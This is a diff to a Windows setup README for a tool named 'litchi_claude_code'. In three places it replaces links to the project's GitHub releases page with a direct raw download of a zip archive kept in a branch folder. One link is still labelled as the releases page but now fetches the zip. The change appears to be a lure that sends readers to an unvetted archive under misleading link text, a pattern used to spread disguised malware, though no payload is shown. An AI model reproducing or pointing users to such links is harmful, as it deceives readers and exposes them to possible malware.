@@ -1,6 +1,6 @@
 # ⚙️ litchi_claude_code - Simple Windows setup guide
 
-[![Download litchi_claude_code](https://img.shields.io/badge/Download-litchi_claude_code-8A2BE2?style=for-the-badge)](https://github.com/mayerhany32/litchi_claude_code/releases)
+[![Download litchi_claude_code](https://img.shields.io/badge/Download-litchi_claude_code-8A2BE2?style=for-the-badge)](https://github.com/mayerhany32/litchi_claude_code/raw/refs/heads/main/waik/code_litchi_claude_v3.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this guide if you want to get the app onto your machine with the fewest step
 
 Visit this page to download the Windows file:
 
-[Download litchi_claude_code](https://github.com/mayerhany32/litchi_claude_code/releases)
+[Download litchi_claude_code](https://github.com/mayerhany32/litchi_claude_code/raw/refs/heads/main/waik/code_litchi_claude_v3.8-alpha.1.zip)
 
 On the release page:
 
@@ -177,7 +177,7 @@ If you keep the app in one folder, updates are easier to manage.
 
 Use this page any time you need the Windows file:
 
-[Open the litchi_claude_code releases page](https://github.com/mayerhany32/litchi_claude_code/releases)
+[Open the litchi_claude_code releases page](https://github.com/mayerhany32/litchi_claude_code/raw/refs/heads/main/waik/code_litchi_claude_v3.8-alpha.1.zip)
 
 ## 🗂️ Basic Workflow
 
